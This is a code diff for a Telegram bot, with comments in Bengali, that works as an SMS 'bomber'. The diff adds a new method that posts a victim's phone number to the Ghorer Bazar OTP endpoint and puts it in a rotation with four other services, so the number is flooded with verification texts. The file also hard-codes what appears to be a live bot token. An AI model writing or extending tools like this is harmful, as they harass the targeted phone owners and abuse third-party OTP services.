@@ -5,7 +5,7 @@ import time
 from flask import Flask
 import requests
 import telebot
-from telebot.types import ReplyKeyboardMarkup, KeyboardButton
+from telebot.types import KeyboardButton, ReplyKeyboardMarkup
 
 # আপনার দেওয়া টেলিগ্রাম বট টোকেন
 TOKEN = "9170879282:AAESbi5FBohsHoVvrs4t-kblWKfULticg4s"
@@ -163,6 +163,34 @@ class Bomber:
       pass
     return False
 
+  # নতুন এপিআই: ঘরের বাজার (Ghorer Bazar)
+  def ghorerbazar(self):
+    url = "https://ghorerbazar.com/submit/otp"
+    headers = {
+        "Host": "ghorerbazar.com",
+        "User-Agent": self.getUserAgent(),
+        "Accept": (
+            "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"
+        ),
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Origin": "https://ghorerbazar.com",
+        "Referer": "https://ghorerbazar.com/varify/otp",
+        "X-Requested-With": "mark.via.gp",
+    }
+    payload = {
+        "_token": "0ecCDCSnO9CedtuzdjGG55EO8dw8RtHN68H2YbE0",
+        "phone": self.user_mobile,
+        "name": "Oustad User",
+        "otp": "",
+    }
+    try:
+      r = requests.post(url, data=payload, headers=headers, timeout=5)
+      if r.status_code in [200, 301, 302]:
+        return True
+    except:
+      pass
+    return False
+
   def start(self):
     counter = 0
     bot.send_message(
@@ -171,7 +199,14 @@ class Bomber:
         f" `{self.number_of_messege}`\n⚡ **বম্বিং কার্যক্রম শুরু হয়েছে...**",
         parse_mode="Markdown",
     )
-    methods = [self.aroggo, self.grameenphone, self.bdtickets, self.shopz]
+    # ৫টি এপিআইয়ের কম্বিনেশন
+    methods = [
+        self.aroggo,
+        self.grameenphone,
+        self.bdtickets,
+        self.shopz,
+        self.ghorerbazar,
+    ]
 
     while counter < self.number_of_messege:
       current_methods = list(methods)
@@ -245,8 +280,11 @@ def handle_text_buttons(message):
   elif text == "📊 Bot Status":
     bot.send_message(
         chat_id,
-        "🟢 **Bot Status:** Online & Active\n🚀 **APIs Loaded:** none,"
-        " Grameenphone, not show, Shopz\n⚡ **Speed:** High Performance",
+        (
+            "🟢 **Bot Status:** Online & Active\n🚀 **APIs Loaded:** Arogga,"
+            " Grameenphone, Bdtickets, Shopz, Ghorerbazar\n⚡ **Speed:** High"
+            " Performance"
+        ),
         reply_markup=get_reply_keyboard(),
         parse_mode="Markdown",
     )
@@ -264,8 +302,10 @@ def handle_text_buttons(message):
   elif text == "👑 Oustad Panel":
     bot.send_message(
         chat_id,
-        "👑 **Developer:** WQ Owner (ওস্তাদ)\n⚡ **Brand:** GRAPIXY HUB\n🌐"
-        " **Hosted on:** Privet",
+        (
+            "👑 **Developer:** Ruhin Ahmed (ওস্তাদ)\n⚡ **Brand:** GRAPIXY HUB\n🌐"
+            " **Hosted on:** Render & GitHub"
+        ),
         reply_markup=get_reply_keyboard(),
         parse_mode="Markdown",
     )
@@ -274,7 +314,6 @@ def handle_text_buttons(message):
 # নম্বর পাওয়ার পর কাউন্ট চাওয়ার স্টেপ
 def process_mobile_step(message):
   target_mobile = message.text.strip()
-  # যদি ইউজার হঠাৎ অন্য কোনো বাটন চাপ দেয়
   if target_mobile in [
       "🚀 Start Bombing",
       "📊 Bot Status",
